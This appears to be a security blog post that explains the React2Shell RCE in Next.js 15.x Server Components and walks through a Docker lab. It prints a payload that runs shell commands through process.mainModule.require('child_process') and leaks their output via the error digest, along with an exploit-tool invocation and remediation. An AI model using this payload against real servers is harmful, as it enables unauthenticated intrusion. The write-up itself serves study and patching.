---
title: React2Shell (CVE-2025-55182) - Critical Vulnerability in React Server Components
description: Deep dive into the React2Shell vulnerability affecting Next.js 15.x. Learn how the exploit works, how to set up a Docker lab, and advanced exfiltration techniques.
snippetone: POC
category: POC
SEOTitle: React2Shell CVE-2025-55182 - RCE Vulnerability in Next.js
lang: en
date: 2025-12-10
---

Recently, the JavaScript ecosystem has been shaken by a critical vulnerability with **CVSS 10.0**: **React2Shell (CVE-2025-55182)**. This vulnerability affects core components of React Server Components (RSC) and, by extension, default configurations of Next.js 15.x.

What makes this vulnerability especially dangerous is not just that it allows for unauthenticated RCE (Remote Code Execution), but that it resides in the client-server communication architecture itself, within an internal protocol called **"Flight"**.

In this post, we will dissect the vulnerability, set up a lab with Docker, and exploit it using advanced error exfiltration techniques.

![React2Shell attack architecture diagram](/static/blog/img/reactDiagram.png)

## The Theory behind Chaos: What went wrong in React?

To understand React2Shell, we must forget the traditional mental model of "HTTP Request → HTML Response". In the world of React Server Components, communication looks more like a complex binary protocol.

### The Flight Protocol

When a browser requests a modern Next.js page, the server doesn't always respond with plain HTML. It uses a serialization protocol called **Flight**. This protocol transmits the Component Tree as a stream of data that progressively hydrates the client.

The flaw lies in the server's deserialization engine for this protocol. Unlike a safe `JSON.parse`, Flight handles live JavaScript concepts such as References, Maps, and Promises.

### The "Thenable" Trap and Type Confusion

This is where the magic of the exploit comes in. In JavaScript, any object that has a property called `.then` is treated as a Promise (a "Thenable").

The React parser on the server blindly trusted the incoming structure:

1. **Injection**: We send a manipulated JSON payload with a `"then"` property.

2. **Confusion**: The server deserializes the object. Upon seeing `.then`, it assumes it is a legitimate Promise that it must resolve.

3. **Execution**: React attempts to "execute" that promise.

4. **Prototype Poisoning**: Since we cannot inject functions directly, we use references to `__proto__` or `constructor` inside that `.then`. This tricks the engine into executing the JavaScript function constructor (similar to an `eval`), giving us access to Node.js primitives like `process` or `require`.

## The Lab: Setting up the Victim

To test this safely, I have created a Dockerized environment that spins up a Next.js 15.0.0 instance (vulnerable) with App Router enabled.

I had to adjust the Dockerfile to avoid the interactive `create-next-app` prompts that failed during the automated build.

### Dockerfile

```dockerfile
FROM node:20-alpine

WORKDIR /app

# Install necessary dependencies to avoid compilation errors on alpine
RUN apk add --no-cache libc6-compat

# CORRECTION FOR THE LAB:
# 1. Add '--yes' to npx to avoid interactive prompts.
# 2. Use explicit arguments to define the project configuration.

RUN npx --yes create-next-app@15.0.0 my-vulnerable-app \
    --use-npm \
    --ts \
    --eslint \
    --tailwind \
    --src-dir \
    --app \
    --import-alias "@/*" \
    --no-turbopack \
    --yes 

WORKDIR /app/my-vulnerable-app

# Rebuild node_modules
RUN npm install

EXPOSE 3000

CMD ["npm", "run", "dev"]
```

### docker-compose.yml

```yaml
version: '3.8'

services:
  react2shell-victim:
    build: .
    ports:
      - "3000:3000"
    networks:
      - lab-network
    environment:
      - NODE_ENV=development

networks:
  lab-network:
    driver: bridge
```

To start the environment:

```bash
sudo docker compose up --build
```

## Exploitation: From "Blind RCE" to Exfiltration

At first, attempting to exploit this can be frustrating. The initial PoCs were "blind": you injected a `touch /tmp/pwned` and had to enter the server to verify if the file existed, because the server simply returned a 500 error or closed the connection.

However, the technique has evolved into a **"Weaponized Exploit"** that uses React's own error handling to exfiltrate data.

### The Advanced Exploit

I used the **NextRce** tool which automates the process. The brilliance of this exploit is that it doesn't need a valid Server Action ID (it attacks non-existent endpoints intercepted by the router) and retrieves the command output.

The key payload does something like this:

```javascript
var res = process.mainModule.require('child_process').execSync('id').toString('base64');
// THROWS AN INTENTIONAL ERROR
throw Object.assign(new Error('x'), { digest: res });
```

React captures this error and, thinking it is a legitimate error code (`digest`), sends it to the client. Boom! We have the command output in the HTTP response.

### Executing the attack

Using the `nextrce.py` Python script:

```bash
python3 nextrce.py -u http://localhost:3000 --cmd id
```

The result is immediate:

![Successful execution showing the user UID in the container](/static/blog/img/reactexpl.png)

## Massive Detection

To identify if you have vulnerable assets, **Assetnote** has published a scanner in Go that does not exploit, but detects the signature of insecure deserialization.

**Repository**: [react2shell-scanner](https://github.com/assetnote/react2shell-scanner)

```bash
python3 scanner.py -u http://localhost:3000
```

![Scanner confirming the endpoint is vulnerable](/static/blog/img/reactscanner.png)

## Remediation

 The solution is urgent and direct. There is no WAF that guarantees total protection due to the complexity of the payload serialization.

### Mitigation steps:

- **Update Next.js**: Version **15.1.0** or higher.

- **Update React**: Version **19.3.0 (Stable)** or higher.

**Important:** If you cannot update, temporarily disable the App Router if it is not critical, although this usually breaks the application.

## Conclusion

React2Shell reminds us that complexity in modern development comes at a price. By blurring the line between client and server with complex serialization protocols, we open new attack surfaces that escape traditional input validations.

This vulnerability demonstrates that innovation in modern frameworks must be accompanied by a thorough security review, especially when introducing new client-server communication protocols.

## 📚 References

- [React2Shell](https://react2shell.com)
- [React2Shell Scanner](https://github.com/assetnote/react2shell-scanner)
- [NextRCE](https://github.com/assetnote/next-rce)
